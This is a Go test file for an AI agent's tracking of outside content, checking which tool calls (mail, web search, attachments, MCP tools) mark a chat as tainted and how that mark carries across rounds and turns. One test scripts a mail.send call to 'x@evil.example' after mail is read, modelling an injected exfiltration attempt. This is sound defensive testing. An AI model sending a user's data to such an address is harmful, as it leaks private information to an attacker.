// Tests for outside.go: which calls bring in outside content, how a
// chat's transcript says so, and how the mark reaches each call across
// rounds and turns.

package agent

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/aarora79/meru/internal/dispatch"
	"github.com/aarora79/meru/internal/engine"
	"github.com/aarora79/meru/internal/rpc"
	"github.com/aarora79/meru/internal/transcript"
)

func TestReadsOutside(t *testing.T) {
	const out, home = "~/meru-output", "/Users/sam"
	tests := []struct {
		name, kind, tool, args string
		want                   bool
	}{
		{"an MCP read", dispatch.KindMCP, "google.search_gmail_messages", `{}`, true},
		{"an MCP send that asks", dispatch.KindMCP, "google.send_gmail_message", `{}`, false},
		{"an MCP tool config no longer lists", dispatch.KindMCP, "old.search", `{}`, true},
		{"an A2A agent", dispatch.KindA2A, "a2a.travel.plan", `{}`, true},
		{"a command", dispatch.KindCommand, "cmd.gh-issue", `{}`, true},
		{"web_search", dispatch.KindBuiltin, "web_search", `{"query":"x"}`, true},
		{"web_fetch", dispatch.KindBuiltin, "web_fetch", `{"url":"https://go.dev"}`, true},
		{"read_file in attachments", dispatch.KindBuiltin, "read_file", `{"path":"~/meru-output/attachments/w2.pdf"}`, true},
		{"read_file in downloads, in full", dispatch.KindBuiltin, "read_file", `{"path":"/Users/sam/meru-output/downloads/page.html"}`, true},
		{"grep in attachments", dispatch.KindBuiltin, "grep", `{"path":"~/meru-output/attachments","pattern":"x"}`, true},
		{"read_file of the user's own note", dispatch.KindBuiltin, "read_file", `{"path":"~/notes/plan.md"}`, false},
		{"read_file of a written note", dispatch.KindBuiltin, "read_file", `{"path":"~/meru-output/notes.md"}`, false},
		{"a look-alike folder", dispatch.KindBuiltin, "read_file", `{"path":"~/meru-output/attachments-old/x.txt"}`, false},
		{"datetime", dispatch.KindBuiltin, "datetime", `{}`, false},
		{"write_file", dispatch.KindBuiltin, "write_file", `{"path":"attachments/x.md"}`, false},
	}
	// asks says the send asks first; old.search, from a server since
	// removed, isn't listed, so it counts as a tool that reads.
	asks := func(name string) bool { return name == "google.send_gmail_message" }
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := readsOutside(tc.kind, tc.tool, json.RawMessage(tc.args), out, home, asks); got != tc.want {
				t.Errorf("readsOutside(%s %s %s) = %v, want %v", tc.kind, tc.tool, tc.args, got, tc.want)
			}
		})
	}
}

func TestReadOutside(t *testing.T) {
	// call writes a tool_call line as dispatch does: an MCP tool's server
	// and tool apart, a built-in's server "meru".
	call := func(id, kind, tool string) transcript.Line {
		server := "meru"
		if kind == dispatch.KindMCP {
			server = "google"
		}
		return transcript.Line{Type: transcript.TypeToolCall, CallID: id, Kind: kind, Server: server, Tool: tool}
	}
	result := func(id, outcome string) transcript.Line {
		return transcript.Line{Type: transcript.TypeToolResult, CallID: id, Outcome: outcome}
	}
	tests := []struct {
		name  string
		lines []transcript.Line
		want  bool
	}{
		{"no tools", []transcript.Line{{Type: transcript.TypeUser, Text: "hi"}}, false},
		{"a local read", []transcript.Line{call("c1", dispatch.KindBuiltin, "read_file"), result("c1", dispatch.OutcomeOK)}, false},
		{"mail read", []transcript.Line{call("c1", dispatch.KindMCP, "search_gmail_messages"), result("c1", dispatch.OutcomeOK)}, true},
		{"a server's error still counts", []transcript.Line{call("c1", dispatch.KindMCP, "get_events"), result("c1", dispatch.OutcomeError)}, true},
		{"a declined call doesn't", []transcript.Line{call("c1", dispatch.KindMCP, "search_gmail_messages"), result("c1", dispatch.OutcomeDeclined)}, false},
		{"an approved send doesn't", []transcript.Line{call("c1", dispatch.KindMCP, "send_gmail_message"), result("c1", dispatch.OutcomeOK)}, false},
		{"a denied call doesn't", []transcript.Line{call("c1", dispatch.KindMCP, "secret"), result("c1", dispatch.OutcomeDenied)}, false},
		{"a call with no result doesn't", []transcript.Line{call("c1", dispatch.KindMCP, "search_gmail_messages")}, false},
		{"the web, in an earlier turn", []transcript.Line{
			{Type: transcript.TypeUser, Text: "news?"}, call("c1", dispatch.KindBuiltin, "web_search"), result("c1", dispatch.OutcomeOK),
			{Type: transcript.TypeUser, Text: "thanks"},
		}, true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			asks := func(name string) bool { return name == "google.send_gmail_message" }
			if got := readOutside(tc.lines, "~/meru-output", "/Users/sam", asks); got != tc.want {
				t.Errorf("readOutside = %v, want %v", got, tc.want)
			}
		})
	}
}

// TestOutsideAcrossRounds runs one turn of three rounds. Round one reads
// mail and a local file side by side: neither call carries the mark, since
// the model asked for both before it saw either. Round two sends, after
// the mail came in: that call carries it. Then a second turn in the same
// chat starts outside, from the transcript.
func TestOutsideAcrossRounds(t *testing.T) {
	eng := &fakeEngine{rounds: []fakeRound{
		{calls: []engine.ToolCall{
			{Name: "mail.search", Arguments: json.RawMessage(`{"q":"new"}`)},
			{Name: "read_file", Arguments: json.RawMessage(`{"path":"~/notes/a.md"}`)},
		}},
		{calls: []engine.ToolCall{{Name: "mail.send", Arguments: json.RawMessage(`{"to":"x@evil.example"}`)}}},
		{pieces: []string{"done"}},
		{calls: []engine.ToolCall{{Name: "mail.send", Arguments: json.RawMessage(`{"to":"sam"}`)}}},
		{pieces: []string{"sent"}},
	}}
	tools := &fakeTools{specs: []engine.ToolSpec{spec("mail.search"), spec("mail.send"), spec("read_file")}}
	router := &fakeRouter{dec: Decision{Route: "tools", Confidence: 0.9, Outcome: "ok"}}
	a := New(testConfig(t), eng, router, nil, tools, nil, nil, quietLog())

	evs, err := run(context.Background(), a, rpc.Request{Op: rpc.OpAsk, Text: "summarize my new mail"})
	if err != nil {
		t.Fatalf("Handle: %v", err)
	}
	if _, err := run(context.Background(), a, rpc.Request{Op: rpc.OpAsk, Session: evs[0].Session, Text: "send sam a note"}); err != nil {
		t.Fatalf("second Handle: %v", err)
	}

	want := []bool{false, false, true, true}
	tools.mu.Lock()
	defer tools.mu.Unlock()
	if len(tools.calls) != len(want) {
		t.Fatalf("got %d calls, want %d", len(tools.calls), len(want))
	}
	for i, c := range tools.calls {
		if c.Outside != want[i] {
			t.Errorf("call %d (%s): Outside = %v, want %v", i, c.Name, c.Outside, want[i])
		}
	}
}

// TestCleanChatStaysClean runs a turn that reads only the user's own
// files: no call carries the mark, in this turn or the next.
func TestCleanChatStaysClean(t *testing.T) {
	eng := &fakeEngine{rounds: []fakeRound{
		{calls: []engine.ToolCall{{Name: "read_file", Arguments: json.RawMessage(`{"path":"~/notes/a.md"}`)}}},
		{calls: []engine.ToolCall{{Name: "remember", Arguments: json.RawMessage(`{"kind":"me","text":"likes tea"}`)}}},
		{pieces: []string{"saved"}},
	}}
	tools := &fakeTools{specs: []engine.ToolSpec{spec("read_file"), spec("remember")}}
	router := &fakeRouter{dec: Decision{Route: "tools", Confidence: 0.9, Outcome: "ok"}}
	a := New(testConfig(t), eng, router, nil, tools, nil, nil, quietLog())
	if _, err := run(context.Background(), a, rpc.Request{Op: rpc.OpAsk, Text: "remember what my note says"}); err != nil {
		t.Fatalf("Handle: %v", err)
	}
	tools.mu.Lock()
	defer tools.mu.Unlock()
	for i, c := range tools.calls {
		if c.Outside {
			t.Errorf("call %d (%s) carries Outside in a chat that read nothing from outside", i, c.Name)
		}
	}
}
